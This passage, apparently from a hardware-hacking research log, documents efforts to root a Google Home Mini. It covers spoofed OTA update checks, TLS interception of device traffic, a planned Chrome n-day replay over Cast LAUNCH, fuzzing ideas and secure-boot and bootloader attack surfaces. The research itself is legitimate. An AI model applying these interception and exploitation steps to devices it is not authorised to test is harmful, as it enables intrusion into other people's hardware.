`scripts/provision-wifi.py` has been updated to auto-fetch the key, encrypt with pycryptodome,
and fall back to plaintext `password` if pycryptodome is absent.

**Install dep:** `pip install pycryptodome` then run:
```bash
python3 scripts/provision-wifi.py --ssid gh-lab --pass ghlab12345
```

### F18. OTA payload extraction — software path to the cast_shell binary

> **Update 2026-11-07 (F19, second Mini on 3.78.540761):** the update check format is now
> known. It is Omaha JSON (`POST tools.google.com/service/update2/json`,
> `updater: GoogleTvEureka`, `board: joplin-b4`, appid
> `{6117439b-1508-4065-9e69-2a006d8f7730}`), with no signature or auth header. For
> `version: 540761` Google answers **`noupdate`**, so 3.78.540761 is the current stable build.
> The 3.75.468362 target should be offered an update with a `payload_url`. Untested, and it
> could also be tried off-device by sending this request with `version: 468362` instead of
> letting the target check in, which would risk auto-updating it.

No public binary exists for `cast_shell` on this build. No community NAND dump.
The only software-only acquisition path:

1. Provision the device onto the Pi AP (it boots and checks for OTA immediately).
2. Intercept the OTA check-in: the device POSTs to Google's update server, which
   responds with a signed `payload_url` (Google CDN, publicly downloadable).
3. Download the real Google-signed `payload.bin` from that URL.
4. Extract the rootfs with `delta_generator` + `unsquashfs` → `cast_shell` at
   `rootfs/system/chrome/cast_shell`.

```bash
# Terminal 1 — start capture + DNS intercept BEFORE provisioning:
sudo bash scripts/fetch-ota-payload.sh --dns-intercept
bash scripts/fetch-ota-payload.sh --capture

# Terminal 2 — provision:
sudo bash scripts/lab-ap.sh start
python3 scripts/provision-wifi.py --ssid gh-lab --pass ghlab12345

# After OTA URL appears in capture log:
wget -O target/payload.bin "<OTA_CDN_URL>"
bash scripts/fetch-ota-payload.sh --extract target/payload.bin
# → target/rootfs/system/chrome/cast_shell
```

Once in hand: `rea open target/rootfs/system/chrome/cast_shell --provider ghidra`
to find the exact Chromium version string and `system()` PLT offset.

### Piste 9 — Chrome n-day via Cast LAUNCH (primary software path)

The Cast LAUNCH JS execution primitive works regardless of SQLite version.
Magellan is almost certainly patched (build 3.75.x ≈ 2023–2024, Chrome 71 fix was 2018).

> **Data point (F19):** a *second* Mini on build 3.78.540761 reports `Chrome/92.0.4515.0`,
> `CrKey/1.56.500000`. The target on 3.75.468362 is older; its Chrome version is still
> unmeasured.

**Step 1 — Get the Chrome version (TODAY, no provisioning):**
```bash
bash scripts/probe-on-hotspot.sh
# Joins setup hotspot, casts probe.html, reports navigator.userAgent via XHR
# Expected: Chrome/8x.x.xxxx.xx or later
```

**Step 2 — Cross-reference CVEs for that exact Chrome version:**
```bash
# After getting the Chrome/XX.0.YYYY.ZZ from probe output:
# Search: https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=chrome+XX.0.YYYY
# Or: https://chromiumdash.appspot.com/releases?platform=Linux
# Find highest-severity CVE patched in Chrome >= (version+1)
```

**Step 3 — Get cast_shell binary (OTA extraction, see F18)**

**Step 4 — Provision onto Pi AP, replay Chrome n-day:**
```bash
python3 reconstruction/exploit/magellan/cast_launch.py \
    <mini-ip> http://10.42.0.1:8080/chrome-nday.html
```

**Step 5 (if Chrome n-day gives code exec inside Chromium renderer):**
Sandbox escape via Cast SDK privileged APIs (`chrome.cast.*`) or kernel exploit.
The Cast receiver process runs without a strong sandbox on Linux (no seccomp profile
comparable to a desktop Chrome renderer).

**Abort condition — if Cast LAUNCH + JS is blocked:**
Try mDNS/SSDP fuzzing: send oversized TXT records to port 5353 and monitor for
crash/restart of cast_shell. Tools: `dns-sd`, `avahi-browse`, or Scapy.

### Piste 10 — Cast SDK privileged JS APIs (zero-day research surface)

`cast_shell` exposes `chrome.cast.*` and `cast.framework.*` to any receiver page loaded
via Cast LAUNCH. These APIs are not available in a normal browser and are specific to the
Cast receiver environment. They may expose:
- Device info, network info (useful for recon post-LAUNCH)
- Cast session control (stop/restart/reboot trigger)
- System-level hooks (volume control calls into alsa/pulseaudio — potential command injection if unvalidated)
- Privileged IPC channels back to the browser process

**Reconnaissance page** — extend `probe.html` to enumerate all `chrome.cast.*` and
`cast.framework.*` properties and exfil the list. This maps the JS API surface
available to an arbitrary Cast receiver for further attack surface research.

### Piste 11 — Post-bootloader parser audit (USB image + mkbootimg header) — no key, no device to start

Extends Piste 5 with concrete targets from F26/F27. The `post-bootloader.joplin-b4`
is **plaintext, signed Thumb-ARM** (~120 KB) — fully auditable. Goal: a
memory-corruption bug in a parser that runs **before/around** the RSA/SHA1 check, so a
crafted input runs our own (unsigned) code with no signing key. Targets, in order:
1. The USB image loader (`Failed to read CPU image header from USB`,
   `Reading %d blocks from USB device`) and the USB descriptor parsers (which already
   have hand-rolled bounds checks → `USB IF descriptor overflowed buffer!`).
2. The mkbootimg/figo header parser (`Invalid mkbootimg header!`, `mkbootimg bootargs:
   %s`, `Generated bootargs: %s`) — attacker-influenced length/offset/cmdline fields.
3. Any anti-rollback/version check (for Piste 12) — none visible in the image headers
   (F25), so confirm presence/absence here.
**Method:** load `zip/post-bootloader.joplin-b4` into Ghidra as raw ARM (strip the
figo header + RSA sig; find the code base from the reset/vector layout), then
decompile the three parsers. No device needed. Reachability of (1) depends on U6.
Reference bug class: Nest Hub U-Boot stack overflow (fredericb.info, 2022).

### Piste 12 — Signed downgrade to a vulnerable kernel via NAND write

If Piste 11 shows the post-bootloader enforces **no fused rollback counter**, then an
older *Google-signed* kernel (e.g. one whose 3.8.13 build still has the YAFFS2 bug,
pre-fix) can be written straight to `mtd6` with a NAND programmer and will pass
verification. That revives Piste 2 on demand. Note the OTA/`updater-script` anti-
downgrade (`ro.build.date.utc` assert, F28) is **software-only** and bypassed by a
raw NAND write. **Blockers:** (a) confirm no bootloader rollback check (Piste 11);
(b) obtain an old signed `boot.img` — the Omaha CDN only offers the current build and
the 40-hex URL suffix for old builds is unknown (F20); a NAND dump of an old unit or an
archived image would supply it. **Needs NAND access either way.**

---

## Network capture (2026-11-07)

### F19. Boot traffic of a second Mini decrypted with mitmproxy — Assistant speaks S3

**Device:** this capture is from a **different** Google Home Mini (`mushroom`, board
`joplin-b4`, build **3.78.540761**, `de-DE`, already set up on the home network), **not**
the unprovisioned `GoogleHome4983` target (3.75.468362, `FR`). Results describe the
current-firmware Mini and carry over to the target only where noted.

Setup, method and full results: `notes/mitm-capture.md`. Evidence:
`evidence/mitm-boot-mini2.flows` (sanitized, absolute times shifted by a secret random
offset) and `evidence/mitm-boot-mini2-decoded.txt`. Flow numbers `[n]` refer to those files.

- **TLS interception from the network works.** All 30 device flows to redirected hosts
  (`*.googleapis.com`, `tools.google.com`) were decrypted, including the Assistant gRPC
  streams, so the device accepts the emudhra-issued leaf. Reading Assistant traffic does
  **not** need root. Exception: `lycraservice-pa` (Nest settings sync), where Google
  rejects the proxy's upstream connection, probably because the host wants the device's
  mTLS client cert (unverified).
- **Versions of the captured Mini:** build 3.78.540761, Chrome 92.0.4515.0 /
  CrKey 1.56.500000, libassistant 16.60.15.918100692. The update server says `noupdate`
  [0], so this is the current stable build. It gives the Omaha request format for F18 and
  a reference point for Piste 9. It says nothing about the target's own kernel/Chrome
  (F7, F16 unchanged).
- **Assistant protocol is internal S3, not EmbeddedAssistant v1alpha2** (contradicts F13
  and `ondevice-plan.md` for current firmware; presumably also true for the target). It
  uses one OAuth token per linked user (scope `androidathome`), plus a fixed API key baked
  into the firmware.
- **The boot message declares the device's client-op capabilities** [8]: `tts.OUTPUT`,
  `led.SET_LED_ANIMATION`, `device.UPDATE_VOLUME`, `timer.*`, `alarm.*`, `media.*`,
  `client.SEND_CONVERSATION_REQUEST`, … This is the command set a replacement agent would
  have to emit.
- **The Mini runs Home Assistant's Local Home SDK app** [17] and forwards smart-home
  intents to HA's webhook over the LAN.

Limitations: boot only, no voice query (the audio leg of `S3Bidi` is unobserved); field
names are unknown (tag numbers only); `mtalk.google.com` (FCM, port 5228) and
`dl.google.com` were not captured.

### F20. Firmware obtained: full OTA for 3.78.540761 via a spoofed Omaha check

**Device:** the request came from the **second Mini** (3.78.540761), not the target. The
image is the generic `joplin-b4` stable build. It is **not** the target's 3.75.468362.

Method (F18 idea, now tested): `scripts/omaha_spoof.py` (mitmproxy addon) rewrites
`app.version` / `os.version` in the device's `tools.google.com/service/update2/json` check
to `468362`. Google answered `status: ok` with a **full** (not delta) OTA. The offer was
the same 3.78.540761 build that the device already runs. Evidence:
`evidence/20261107-omaha-spoof-468362.json` (serial redacted).

- Offer: `codebase` `https://redirector.gvt1.com/edgedl/googletv-eureka/stable-channel/ota.540761.tz_stable-channel.joplin-b4.306c410f30d96e6fdc4aa221a027510d17adf9ef.zip`,
  95 990 069 bytes, sha256 `79180a03…72d32` (matches), `RebootNow: true`. The URL is public:
  no auth and no device binding, so anyone can download it.
- `scripts/fetch-ota.sh` downloads, verifies and unpacks it into `target/ota-540761/`
  (`zip/`, `rootfs/`, `ramdisk/`, `kernel.bin`, `Image` next to the zip). Inventory and hashes:
  `evidence/20261107-ota-540761-inventory.txt`.
- Format: Android recovery-style signed zip (SignApk, `otacert` O=Chromecast, 2017–2037),
  with `updater-script`. It contains `system.img` (SquashFS 4.0 zlib → rootfs), `boot.img`,
  `bootloader`, `post-bootloader`, `tz_en`. It is **not** an A/B `payload.bin`, so
  `delta_generator` (F18) is not needed.
- Rootfs: `chrome/cast_shell` (66 MB, ARM32 PIE, `Chrome/92.0.4515.0`, `CrKey/3.78.540761`),
  `chrome/bin/assistant` (386 KB, carries the libassistant source paths), `iot_audio`,
  `iot_audio_capture`, `ml_framework`, `update_engine`, `process_manager`,
  `lib/libcast_assistant_1.0.so`. **There is no separate `libassistant.so`** (contradicts
  F13's file layout for this build); where libassistant actually lives
  (`cast_shell` vs `bin/assistant`) is still open.
- `boot.img`: a 332-byte signature header, then an Android boot image. The kernel is
  **Linux 3.8.13+**, built **Fri Sep 20 2024** (XZ zImage). The ramdisk holds `/dmtable`:
  `verity` over `mtdblock7` with a sha256 root hash, and `init.rc` mounts `/dev/mapper/system`.
  **This confirms U4's dm-verity for this build.**
- The kernel is still 3.8.13 as of a 2024 build. Whether the YAFFS2 fix (Piste 2 / F7) is
  backported is **open**. That can now be checked statically in `target/ota-540761/Image`.

Side effect: in the spoofed run the response was passed through un-neutralized. The second
Mini then reported Omaha event `eventtype 13, eventresult 1` (download started) [8], so it
probably re-downloaded and re-flashed the same 3.78 build. That is harmless, but
`omaha_spoof.py` now neutralizes by default.

Limitations: this is 3.78, not the target's 3.75. To get 3.75 we would need an older
`codebase` URL. Omaha only ever offers the current build; guessing old URLs needs the
40-hex suffix, which is unknown.

### F21. What the 3.78 firmware tells us: the Assistant sits behind a local gRPC seam

Source: the OTA from F20 (`target/ota-540761/`). This is the **second Mini's** build, 3.78.540761.
It is **not** the target's 3.75. Evidence: `evidence/20261108-ota-540761-grpc-surface.txt`
(gRPC paths, configs, init entries) and `evidence/20261108-libhvc-recovered-protos.txt`
(recovered schemas, from `scripts/recover_lite_protos.py`).

- **Process split.** Observed:
  - `init.rc` starts `service assistant` = `/system/chrome/bin/assistant` (386 KB host), as uid `chrome`.
  - The Assistant engine (S3 client, libassistant) is **`chrome/libhvc_perception_joplin.so`**
    (16 MB). It is the only file containing the `S3Bidi` / `S3OnePlatform` strings.
    `cast_shell` (66 MB) does not contain them.
  - `assistant_bootup_config.json` makes the engine serve gRPC on unix sockets:
    `/tmp/grpc/libassist_grpc.socket`, `libassist_audio_input.socket`,
    `libassist_audio_output.socket`, plus `libassist_uds_audio_{input,output}.socket`.
  - `libas_customer.use_client_audio_service: true`: the engine takes mic audio from the
    embedder (`cast_shell`) over gRPC.
- **Local API (strings).**
  - The engine serves `assistant.api.*`: `ConversationService` (21 methods, e.g.
    `SendTextQuery`, `StartInteraction`, `ExecuteInteractionDelta`), `AlarmTimerService`
    (20), `ConfigSettingsService`, `AudioUtilsService` (`PlayTtsText`), `BootupSettingsService`
    (`SetS3ApiKey`), `EventNotificationService`, …
  - `cast_shell` additionally serves embedder services: `ClientAudioService`,
    `EmbedderUtilityService`, `SecureFileService`, `DeviceActionService`, `ActionService`.
- **Schemas are recoverable without symbols (inference, partly verified).**
  - The assistant protos use protobuf **lite** (no embedded descriptors;
    `scripts/find_proto_descriptors.py` finds only Nest-trait/perfetto ones). The engine
    library's table-driven parser data (`TcParseTable`) still holds field numbers, wire
    kinds, cardinality and sub-message pointers.
  - `recover_lite_protos.py` decodes **563** (first version; 1080 after F24 fixes) `assistant.*`/`speech.*`/… messages
    (847 tables, 4488 fields, every field number resolved). Examples:
    `SendTextQueryRequest { string 1 }`, `PlayTtsTextRequest { string 1; string 2 }`,
    `PlayTtsTextResponse { bool 1 }`.
  - **Limits:**
    - Field **names** are absent (lite).
    - 483 sub-message references stay unnamed (cross-library or runtime-filled aux slots).
    - The type-card bit layout is assumed from protobuf ≥ v27 and **not verified** against
      the exact protobuf revision. `string` vs `bytes` and enum vs int are uncertain.
    - `cast_shell` yields 0 tables (older Chromium-92 protobuf, different layout).
- **Hardening facts.**
  - `ro.build.have_selinux=false`.
  - `cast_shell` and `assistant` share uid `chrome` (group `grpc`).
  - rootfs is SquashFS under dm-verity (F20); `/data` is a bind of the writable YAFFS2 `/cache`.
  - Root-running network daemons: `dhcpcd-6.8.2`, plus `wpa_supplicant` / `hostapd`
    `v2.6-devel-3.78` and `dnsmasq-2.78`.
  - The kernel `Image` keeps **kallsyms** (function names, e.g. `yaffs2_scan_backwards`),
    so the Piste 2 YAFFS2 fix question can be settled in Ghidra with names.
- **Modules.**
  - `modular_updater/prebuilt_images/localhome.squashfs` = `localhomeplatform_binary`
    (Local Home / smart-home mesh, seccomp policy, 103 full descriptors).
  - The signed `modular_manifest.pb` also names an `assistant` module v1.61 that is not
    in the OTA (downloaded at runtime?). **Unknown.**

**Implication for the goal (inference):** a local-LLM agent does not have to reimplement
Google's cloud S3 protocol. On the device, it can take the place of the `assistant`
process and serve `assistant.api.*` on `/tmp/grpc/libassist_grpc.socket` (plus
the audio sockets) to an unmodified `cast_shell`. That only needs code execution as uid
`chrome` at runtime (not root, not a modified rootfs), but it would not persist across
reboots because of dm-verity. Still needs proof on a device. The call sequence `cast_shell`
expects (boot handshake, which methods are mandatory) has to come from Ghidra on
`cast_shell` / `libhvc_perception_joplin.so`.

### F22. YAFFS2 object-confusion bug (Piste 2) is **patched** in the 3.78 kernel

Evidence: `evidence/20261108-kernel-3.78-yaffs-fix.txt`. Source: `target/ota-540761/Image`, symbolized with `vmlinux-to-elf` → `work/vmlinux-3.78.elf`
(25 362 kallsyms symbols, base `0xc0008000`). Reference for the bug: courk, "Running Custom
Code on a Google Home Mini (Part 2)", https://courk.cc/running-custom-code-google-home-mini-part2
(read 2026-11-08). Its tested kernel was `3.8.13+ … Fri Jun 7 2019`. The post says the 2014
upstream fix is in newer Google kernels.

- Observed: `yaffs_retype_obj` exists (`0xc028d180`, 348 B). Its only caller is
  `yaffs2_scan_backwards` at `0xc02942c4` (`yaffs2_scan_chunk` is inlined).
- Observed: the code just before the call is exactly the fixed mismatch branch.
  `ldrb [in]; tst #0x80` (`!in->valid`), `ldr [in,#0x64]` (`variant_type`) compared with
  `oh ? oh->type : tags.extra_obj_type`, then an optional trace (`tst #0x40000000`,
  YAFFS_TRACE_ERROR, "yaffs tragedy: Bad type" string present), then
  `in = yaffs_retype_obj(in, type)`. The vulnerable 2019 code only logged and then set
  `variant_type`, leaving the union alone.
- Conclusion: **Piste 2 does not work against a 3.78 kernel.** Unknown: the target's own
  3.75.468362 kernel. Its build date is not known, but if it was built after the
  2019 kernel courk tested it is probably patched too. Only its own image (or a NAND dump)
  can tell. Reflashing the target to an old vulnerable kernel is not possible through
  verified OTA (`updater-script` asserts the build date does not go backwards).

### F23. Bootup contract between `cast_shell` and the Assistant engine (3.78)

Source: strings and gRPC paths in `cast_shell` / `libhvc_perception_joplin.so`
(`evidence/20261108-ota-540761-grpc-surface.txt`), schemas in
`evidence/20261108-libhvc-recovered-protos.txt`. These are static strings only. The **order** is
inferred from log messages, not from traced code.

Client implementation: `chromecast/internal/assistant/app/{assistant_impl,
assistant_service_client_impl, cast_assistant_service}.cc`,
`event_handlers/bootup_manager.cc`, `assistant_health_checker.cc`. Inferred sequence:
1. `init` runs `try_start_assistant.sh` → `setprop ctl.start assistant`. The engine serves
   gRPC on `/tmp/grpc/libassist_grpc.socket`.
2. `cast_shell` starts `Cast.Assistant.Bootup.Start` and caches everything until "Libassistant
   server is ready": config string, S3 API key, user token list, internal options,
   connection status, volume, pipeline gains, user settings.
3. `cast_shell` registers as the engine's customer with
   `CustomerRegistrationService/RegisterCustomer` (`{string 1; repeated map 2}`, probably its
   own service endpoints). The log says "detected libassistant is down. Re-registering…",
   so the client survives engine restarts.
4. It flushes the caches: `BootupSettingsService/SetConfigString`, `SetS3ApiKey {string 1}`,
   `SetAuthInfo {enum 1; repeated msg 2}`, `SetInternalOptions`,
   `SystemService/UpdateConnectionStatus|UpdateVolumeState|UpdateMicMuteState`, …
5. It subscribes with `EventNotificationService/RegisterEventHandler` (22-field request:
   which event classes to receive), `RegisterHeartbeatHandler`, `RegisterGcmHandler`, and
   `RegistrationService/Register{EmbedderUtilityService,CallService,NightModeState,…}`.
6. "Assistant bootup complete" / `Cast.Assistant.Bootup.End`. Otherwise
   `assistant-bootup-timeout-secs` → "Bootup timeout hit."

Runtime calls from `cast_shell` to the engine: `ConversationService/{StartInteraction,
StopInteraction, SendTextQuery, SendClientInput, SendVoicelessInteraction, SetCapabilities,
SetDeviceProperties, UpdateDeviceState, RegisterActionHandler, RegisterDeviceActionHandler,
StopAllTts}`, `AudioUtilsService/{PlayTts, PlayTtsText, PlayReadyMessage, EnableListening}`,
`AlarmTimerService/*`, `ConfigSettingsService/*`.
The engine calls back into `cast_shell`'s services: `ClientAudioService/{Get,Set}{Volume,
Muted}, SetAudioFocus`, `EmbedderUtilityService`, `SecureFileService`, device/action handlers.

Implication: a replacement engine must at least accept `RegisterCustomer`, the
`BootupSettingsService` setters, `RegisterEventHandler` (and stream events back), the
heartbeat, and the audio services (F24). The rest can return empty or OK at first.
**Which methods are hard requirements is unknown.** That needs the client's response
handling (Ghidra/capstone on `cast_shell`) or a test on the device.

### F24. Audio path: protobuf messages over unix sockets ("UDS transport")

- Engine side (`libhvc/internal/services/platform/uds_audio_{input,output}_service.cc`):
  "Creating UDS audio socket for path: …". It serves either gRPC or UDS for each direction,
  never both (`!(grpc_audio_input_service_ && uds_audio_input_service_)`). The paths come
  from `assistant_bootup_config.json`: `/tmp/grpc/libassist_uds_audio_input.socket`,
  `libassist_uds_audio_output.socket`. The socket owner is set to `opal_socket_group`
  (`wayland`).
- Client side (`cast_shell`, `chromecast/internal/assistant/shared/uds_transport/`):
  - `UdsAudioInputSender` sends an "initial request" with a `SourceType` and then streams
    mic audio as `StreamAudioInputRequest` (paused/resumed on demand).
  - `UdsAudioOutputClient` sends a registration `StreamAudioOutputRequest` and receives
    `StreamAudioOutputResponse` (`INITIAL`, data, `STOP`).
- Recovered schemas (field names unknown, roles inferred):
  - `StreamAudioInputRequest`: `enum 4` (source type?), `msg 5` (`AudioBuffer`?), `enum 6`.
  - `AudioBuffer`: `bytes 1` (PCM?), `int64 2` (timestamp?), `int32 3`.
  - `AudioBufferFormat`: `int32 1` (sample rate?), `enum 2` (encoding), `int32 3` (channels?).
  - `StreamAudioOutputResponse`: `enum 1` (type: INITIAL/DATA/STOP?), `enum 2`, `msg 3`,
    `int32 4`, `bytes 5`, `bytes 6`, `int64 7`, `msg 9`.
  - `OutputStreamFormat`: `enum 1`, `int64 2`, `int32 3`.
  - mitm R3 saw a 16000.0 sample rate on the cloud side.
- **Unknown:** how messages are framed on the socket (length prefix? `SOCK_SEQPACKET`?),
  and the actual sample format. Both are needed before a replacement can read mic audio.
  Next: disassemble `UdsAudioInputSender` send path, or capture the socket on a device.

Tooling added: `scripts/recover_lite_protos.py` now checks each table and tries both
name-padding alignments. It decodes **1080 messages / 5607 fields** from
`libhvc_perception_joplin.so`. 915 sub-message references remain unnamed, and some small
"aux" values (e.g. `msg_0x2`) are not pointers, so the aux format is only partly understood.

### F25. Signed-image header formats in the OTA (static observation)

From the first 96 bytes of each image in `target/ota-540761/zip/`:
- `bootloader.joplin-b4` (prebootloader, 128 KB): header begins `01 00 00 00 37 c2 00 01`
  then immediately high-entropy data. Distinct format from the others — this is the
  stage the Marvell BootROM loads and (per courk F-chain) is verified against an
  OTP-fused key. Not patchable.
- `post-bootloader.joplin-b4`, `tz_en.joplin-b4`, `boot.img` all share one container:
  `01 00 00 00` then a little-endian **`0xC0DE`** magic (`de c0`) at offset 4, a type/
  flag byte, a length field, then an RSA-signature-sized high-entropy block before the
  payload. This is the signed-image wrapper each prior stage checks (postbootloader
  verifies kernel; TZ/postbootloader verified by the bootloader).
- No plaintext version/anti-rollback counter is visible in these headers; whether a
  fused rollback counter is enforced is **open** — answer it by decompiling
  `post-bootloader.joplin-b4` (Google released its source; Piste 5).

### F26. Secure-boot architecture, fully mapped from the OTA images

Static analysis of `target/ota-540761/zip/*` (headers, entropy, strings).
Evidence: `evidence/20261108-postbootloader-secureboot.txt`.

**Image container ("figo" / Marvell secure image).** All chain images start with
`01 00 00 00` then LE magic **`0xC0DE`** (`de c0`) at offset 4, a type byte (0x00
kernel/postbootloader, 0x02 TZ), a 16-byte hash/IV field (non-zero only for the
encrypted TZ), image length at offset 40, then an RSA-signature-sized block, then the
payload. The post-bootloader itself prints `figo magic = %x, figo_off, figo_len`.

**Encryption split (from body entropy):**
- `bootloader.joplin-b4` (prebootloader) — entropy ~8.0 → **signed AND encrypted**.
- `tz_en.joplin-b4` (TrustZone) — entropy ~8.0 → **signed AND encrypted** (carries IV).
- `post-bootloader.joplin-b4` — entropy ~5–6 → **signed, NOT encrypted**. It is
  plaintext Thumb-ARM and therefore the one auditable stage (Piste 5 is viable).
- `boot.img` — figo header, then a standard `ANDROID!` boot image (kernel + ramdisk).

**Key store (strings in post-bootloader):** a hardware keystore with indexed keys —
`RSA KEY INDEX:%1X`, `Load No.%d RSA Public Key into User Key DTCM Area`, plus
`RKEK CRC`, `AESK0 CRC`, `SIGNK7 CRC`. Keys are loaded into on-chip DTCM. There is a
**Customer Key Store** (`Loading Secure Customer Key Store is finished`,
`Warning: Invalid key store!`), flashed by `/bin/flash_custk`. The keystore is itself
anchored to the SoC's fused RKEK, so you cannot swap in your own public key without
the Marvell root key.

**Verification chain confirmed:** Marvell ARMADA 1500 Mini-Plus BootROM (fused RKEK)
→ prebootloader (enc) → TZ (enc) → post-bootloader verifies the kernel:
`bootimg SHA1 verify fail`, `Boot image verify header failed!`, `Verify k_buff image
failed!`, `no need to load kernel keys`. Kernel integrity is **SHA1**, key is RSA.
Rootfs is dm-verity (F20). → **Replacing any pre-kernel stage needs the Google/Marvell
signing key; replacing the kernel needs the key OR a bug in post-bootloader.**

### F27. USB-boot image path in the post-bootloader — a real parser attack surface

The post-bootloader contains a full USB-EHCI host + mass-storage stack and an image
loader that runs **before** (and around) signature verification:
- `Detected button press -- booting from USB`
- `Booting from NAND failed, booting from USB....!` (USB is the NAND-failure fallback)
- `Failed to read CPU image header from USB`, `Reading %d blocks from USB device`
- USB descriptor parsing with its own bounds checks (`USB IF descriptor overflowed
  buffer!`, `Too many USB interfaces!`, `Invalid USB EP length`) — i.e. hand-rolled
  parsers, the classic bootloader-overflow class (cf. Nest Hub U-Boot bug, Piste 5).
- An `mkbootimg`/figo header parser (`Invalid mkbootimg header!`, `mkbootimg bootargs:
  %s`, `Generated bootargs: %s`) that reads attacker-influenced fields.

Loaded USB images are still verified (`Verify k_buff image failed!`), so a *valid*
boot still needs the signing key. The exploitable target is a **memory-corruption bug
in one of these parsers, reached before/independent of the signature check** — this is
the most promising no-key route to running our own kernel.

Hardware caveat: the Mini's micro-USB is "power-only" (F2) — D+/D- are not used in
normal operation, but the SoC's USB-boot path clearly exists in code. Whether the data
lines are routed/tappable on the H0A PCB is an open hardware question (new U6).
Triggered by: a button held at boot, or NAND made to fail to boot.

### F28. OTA / userland flashing layer (no new bypass)

- `/bin/flash_image` and `/bin/flash_custk` are generic userland MTD raw writers
  (ELF ARM PIE) — they `ioctl` `/dev/mtd*` directly. Post-root they let you write any
  partition, **but** the written image is still verified by the stage above at next
  boot, so they are a post-exploit primitive, not a bypass.
- `chrome/update_engine` verifies the OTA with **RSA-PSS + SHA-256** (`rsassaPss`,
  `sha256WithRSAEncryption`) and enforces `targetversionprefix` (anti-downgrade at the
  update layer). No weakness observed; the OTA path stays closed.
- `/bin/flash_bootloader` (called by the recovery `updater-script`) is **not** in the
  main rootfs — it ships in the recovery ramdisk (`boot/recovery.img`); worth pulling
  if the bootloader-flash routine is of interest.

### F29. UDS audio framing and mic-message layout (client side, 3.78) — resolves the F24 framing unknown

Evidence: `evidence/20261108-uds-audio-framing-ml_framework.txt`. Source: Ghidra 12.2 headless on
`chrome/bin/ml_framework`. It is a 3.3 MB binary that links the same
`chromecast/internal/assistant/shared/uds_transport/` code as `cast_shell`
(`uds_audio_input_sender.cc`, `uds_client_socket.cc`). Field offsets are cross-checked
against libhvc's own `TcParseTable` entries. Static only; nothing was run.

- **Socket.** A plain `AF_UNIX` stream connect to a filesystem path (`sun_family = 1`,
  path copied without a leading NUL, so it is not the abstract namespace) (`FUN_001fadc4`).
  Writes and reads go through Chromium's socket `Write`/`Read`, with no extra header.
- **Framing (observed).** Each protobuf message is sent as
  `[u16 big-endian payload length][serialized message]`. `FUN_001faa48` builds the 2-byte
  BE header and appends the payload. `FUN_001f99d4` serializes (`SerializeAsString`) and
  then calls Send. The reader (`FUN_001fa99c`) waits for `2 + len` bytes, then takes exactly
  `len` bytes. Consequences:
  - The maximum message size is 65,535 bytes.
  - Inference: the reader resets its buffer after one message, so a server should write
    one frame per message and not coalesce frames.
  - The same `uds_client_socket.cc` serves `UdsAudioOutputClient`, so output
    (`StreamAudioOutputRequest/Response`) is very likely framed the same way.
    Not checked separately.
- **`StreamAudioInputRequest` (client → engine), observed field use:**
  - `f4` enum = `SourceType` (set in every request).
  - `f5` = `AudioInputData`:
    - `f1` = `AudioBufferFormat`. It is filled when the format changes and in the first
      chunk: `f1` int32 **sample_rate**, `f2` enum **sample_format**, `f3` int32 **num_channels**.
      Names come from the adjacent log labels.
    - `f3` = `AudioBuffer`: `f1` bytes **PCM data**, `f2` int64 (timestamp?), `f3` int32
      (frame count? taken from a virtual getter).
    - `AudioInputData.f2` (enum) and `f4` (bool) are not written by this sender.
  - `f6` enum: set to `0` when the first observer registers and to `1` when the last one
    leaves. It is also sent as `0` in the initial request if observers exist. Meaning unknown
    (observer/feedback on/off?).
- **`sample_format` values (observed table + `+1` mapping):** `1 = INTERLEAVED_S16`,
  `2 = INTERLEAVED_S32`, `3 = INTERLEAVED_F32` (`0` presumably unspecified). The concrete
  rate/format/channels come from the audio source at runtime. **Unknown statically.**
  F19's 16000 Hz cloud-side rate suggests 16 kHz, but that is not proof for the socket.
- **`StreamAudioInputResponse` (engine → client)** (`FUN_001f9c8c`). Interpretation of the
  state machine: `f1 = 1` pauses streaming and `f1 = 2` resumes it. Audio chunks are only
  sent while the sender is in its streaming state. `f2` is a sub-message whose fields go to
  observers. Not decoded.
- **Implication (inference):** a replacement engine can listen on
  `/tmp/grpc/libassist_uds_audio_input.socket`, accept the stream connection, read
  `u16 BE`-length-prefixed `StreamAudioInputRequest`s, and hand `AudioBuffer.f1` PCM to a
  local STT. It can answer with `StreamAudioInputResponse{f1}` to pause or resume the mic.
- **Still open:**
  - Server-side confirmation in `libhvc` (Ghidra run in progress).
  - Whether the server must reply before the client streams. Interpretation: the sender
    streams right after the initial request.
  - `f6` meaning, the runtime sample format, and output-side message order.

Tooling: Ghidra 12.2 + OpenJDK 25 are now installed (`/opt/ghidra`). The new script
`scripts/ghidra/DecompileByString.java` decompiles only the functions that reference matching
strings (or `@addr` lists) plus their callees. Projects live in `work/ghidra/`.
